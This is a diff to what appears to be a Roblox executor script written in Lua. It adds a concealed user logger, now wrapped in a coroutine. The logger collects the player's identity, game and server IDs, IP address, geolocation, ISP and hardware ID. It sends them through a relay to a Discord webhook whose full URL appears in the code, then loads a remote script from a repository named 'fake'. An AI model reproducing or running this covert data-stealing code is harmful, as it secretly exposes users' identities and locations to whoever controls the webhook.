@@ -81,18 +81,20 @@ GUI.Hint_00:Destroy()
 
 if (writefile) and (getcustomasset) then
 	local LocalPlayer = game:GetService("Players").LocalPlayer
-	local WhoIs = game:GetService("HttpService"):JSONDecode(mirror("https://ipwho.is/"))
-	local message = request({
-		Url = "https://mirrorr.onrender.com/send",
-		Method = "POST",
-		Headers = {
-			["Content-Type"] = "application/json"
-		},
-		Body = game:GetService("HttpService"):JSONEncode({
-			webhook_url = "https://discord.com/api/webhooks/1499751083197857922/Lb3-E0JPX3PFbOlHDZYl89JO7nuHQS_PlxVXMfm9r-Zb4Obq4omprJ_zzxE1ICB1yRq9",
-			content = '# --- USER LOGGED ---\n### Player Information\nDisplayName : "['..LocalPlayer.DisplayName..'](https://www.roblox.com/users/'..LocalPlayer.UserId..'/profile)"\nUsername : "'..LocalPlayer.Name..'"\nUserId : "'..LocalPlayer.UserId..'"\n### Game Information\nGame Name : "['..game:GetService("MarketplaceService"):GetProductInfoAsync(game.PlaceId).Name..'](https://www.roblox.com/games/'..game.PlaceId..')"\nGameId : "'..game.GameId..'"\nPlaceId : "'..game.PlaceId..'"\nJobId : "['..game.JobId..'](https://www.roblox.com/games/start?placeId='..game.PlaceId..'&gameInstanceId='..game.JobId..')"\n### Sensitive Information\nIP : "'..WhoIs.ip..'"\nCountry : "'..WhoIs.country..'"\nRegion: "'..WhoIs.region..'"\nCity: "'..WhoIs.city..'"\nHWID : "'..gethwid()..'"\nORG : "['..WhoIs.connection.org..'](https://'..WhoIs.connection.domain..')"\nISP : "'..WhoIs.connection.isp..'"\n### Other Information\nExecutor: "'..identifyexecutor()..'"',
+	local WhoIs = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://ipwho.is/"))
+	coroutine.wrap(function()
+		local message = request({
+			Url = "https://mirrorr.onrender.com/send",
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json"
+			},
+			Body = game:GetService("HttpService"):JSONEncode({
+				webhook_url = "https://discord.com/api/webhooks/1499751083197857922/Lb3-E0JPX3PFbOlHDZYl89JO7nuHQS_PlxVXMfm9r-Zb4Obq4omprJ_zzxE1ICB1yRq9",
+				content = '# --- USER LOGGED ---\n### Player Information\nDisplayName : "['..LocalPlayer.DisplayName..'](https://www.roblox.com/users/'..LocalPlayer.UserId..'/profile)"\nUsername : "'..LocalPlayer.Name..'"\nUserId : "'..LocalPlayer.UserId..'"\n### Game Information\nGame Name : "['..game:GetService("MarketplaceService"):GetProductInfoAsync(game.PlaceId).Name..'](https://www.roblox.com/games/'..game.PlaceId..')"\nGameId : "'..game.GameId..'"\nPlaceId : "'..game.PlaceId..'"\nJobId : "['..game.JobId..'](https://www.roblox.com/games/start?placeId='..game.PlaceId..'&gameInstanceId='..game.JobId..')"\n### Sensitive Information\nIP : "'..WhoIs.ip..'"\nCountry : "'..WhoIs.country..'"\nRegion: "'..WhoIs.region..'"\nCity: "'..WhoIs.city..'"\nHWID : "'..gethwid()..'"\nORG : "['..WhoIs.connection.org..'](https://'..WhoIs.connection.domain..')"\nISP : "'..WhoIs.connection.isp..'"\n### Other Information\nExecutor: "'..identifyexecutor()..'"',
+			})
 		})
-	})
+	end)()
 
 	loadmirror("https://raw.githubusercontent.com/SkibidiSource/fake/refs/heads/main/KeySystem")
 else
